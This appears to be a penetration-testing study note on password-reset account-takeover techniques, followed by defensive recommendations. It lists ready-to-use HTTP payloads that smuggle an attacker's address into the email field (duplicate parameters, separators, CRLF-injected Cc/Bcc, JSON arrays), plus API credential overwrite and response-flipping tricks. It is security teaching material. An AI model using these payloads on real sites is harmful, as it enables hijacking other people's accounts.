---
tags: [vapt, authentication, password-reset, account-takeover, parameter-pollution, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.29 Forgot Password — Email Parameter Manipulation & Token Leak Bypasses"
---

# 16.29 — Forgot Password: Email Parameter Manipulation & Token Leak Bypasses

## What is it?
The password-reset flow is a favourite account-takeover target because it deliberately issues a credential (the reset token) over email. This note covers reset bypasses **not** already in:
- [[07 - Forgot Password — Token Predictability]]
- [[08 - Forgot Password — Host Header Poisoning]]
- [[09 - Forgot Password — Token Reuse]]

Here we focus on **getting the reset token delivered to the attacker** by abusing how the server parses the email field, and on **leaking the token after it's issued**.

Think of the reset endpoint as a clerk mailing a spare key. If you can scribble a second address on the envelope — or get the clerk to CC the attacker — the key arrives at your door too.

## 1. Token leak via Referer header
If the reset link contains the token in the **URL**, and the reset page loads any third-party resource (analytics, social widgets, external links), the browser sends the token in the **`Referer`** header to that third party.

**Test:** request a reset, click the link, but **don't change the password**. Navigate to a third-party site while intercepting in Burp. Inspect outgoing requests — if the `Referer` carries the reset token, it's leaking → attacker (or any third party) can replay it for ATO.

## 2. Email parameter manipulation (deliver token to attacker)
The core trick: submit **both** the victim's and the attacker's email so the backend validates one but mails the other. Try every separator — different parsers split differently:

```http
POST /resetPassword
email=victim@email.com&email=attacker@email.com          # duplicate param
```
```http
email=victim@email.com%20email=attacker@email.com        # space separator
```
```http
email=victim@email.com|email=attacker@email.com          # pipe separator
```
```http
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"        # CRLF -> add Cc
```
```http
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"       # CRLF -> add Bcc
```
```http
email="victim@mail.tld",email="attacker@mail.tld"        # comma list
```
```json
{"email":["victim@mail.tld","attacker@mail.tld"]}         // JSON array
```

Expected win: the reset email (with the valid token) is also delivered to the attacker address.

> The CRLF `cc:`/`bcc:` variants overlap with [[../I - 10 - Injection Attacks/21 - Email Header Injection and Address Spoofing]] — same primitive, applied to the reset mailer.

## 3. Account takeover via API parameters
Some APIs let you set both email and password directly, skipping the token entirely:
```http
POST /api/changepass
{"form": {"email":"victim@email.tld","password":"12345678"}}
```
If the endpoint doesn't verify the **current session owns** that email, you overwrite any user's credentials → full ATO. (Mass-assignment cousin — see Business Logic / Access Control.)

## 4. Response manipulation
If the reset/verify step returns a JSON like `{"success":false}`, intercept and flip it to `{"success":true}`. Where the client trusts the response to advance the flow, this bypasses the check. (Same idea as [[11 - MFA Bypass — Response Manipulation]], applied to reset.)

## 5. Registration-as-password-reset (upsert on existing email)
If "register" performs an **upsert** keyed on email, re-registering an existing victim email may **overwrite** the stored password/credentials instead of erroring — resetting the victim's account without any token.

## 6. Other quick wins
- **Email bombing** — no rate limit on reset = mail flood (DoS / annoyance).
- **Expired token still accepted** — replay an old token.
- **Brute-force token** — short/low-entropy tokens with no rate limit.
- **Use your own token on another account** — request your token, then submit it with the victim's user id (token not bound to account).
- **No session invalidation** on reset/logout — old sessions stay alive after password change.

## ASCII Diagram
```text
================================================================================
              EMAIL PARAMETER POLLUTION -> RESET TOKEN TO ATTACKER
================================================================================

  POST /resetPassword
  email=victim@email.com&email=attacker@email.com
                |
                v
  Backend VALIDATES on:  victim@email.com   (account exists -> proceed)
  Backend MAILS to:      attacker@email.com (last value wins in mailer)
                |
                v
  reset link + token  --->  attacker inbox  --->  ACCOUNT TAKEOVER
================================================================================
```

## Hands-on workflow
1. Map the reset flow (request → email → token link → set new password).
2. Test **every** email-parameter separator above; check which mailbox gets the token.
3. Check the reset link for a token-in-URL + `Referer` leak.
4. Probe the API set-password endpoint for missing session-ownership checks.
5. Try registration upsert and response manipulation.

## Defense
- **Bind the token to the account** server-side; never derive the recipient from a client-supplied second email. Parse the email field strictly (reject duplicates, arrays, CRLF, separators).
- Put the token in a **POST body or short-lived server-side session**, not the URL; add `Referrer-Policy: no-referrer` on reset pages.
- Reset endpoints: **single-use**, short expiry, rate-limited, and **invalidate all sessions** on success.
- Authorize credential-change APIs against the **current session**, not a request parameter.

## Related
- [[07 - Forgot Password — Token Predictability]] · [[08 - Forgot Password — Host Header Poisoning]] · [[09 - Forgot Password — Token Reuse]]
- [[../I - 10 - Injection Attacks/21 - Email Header Injection and Address Spoofing]]
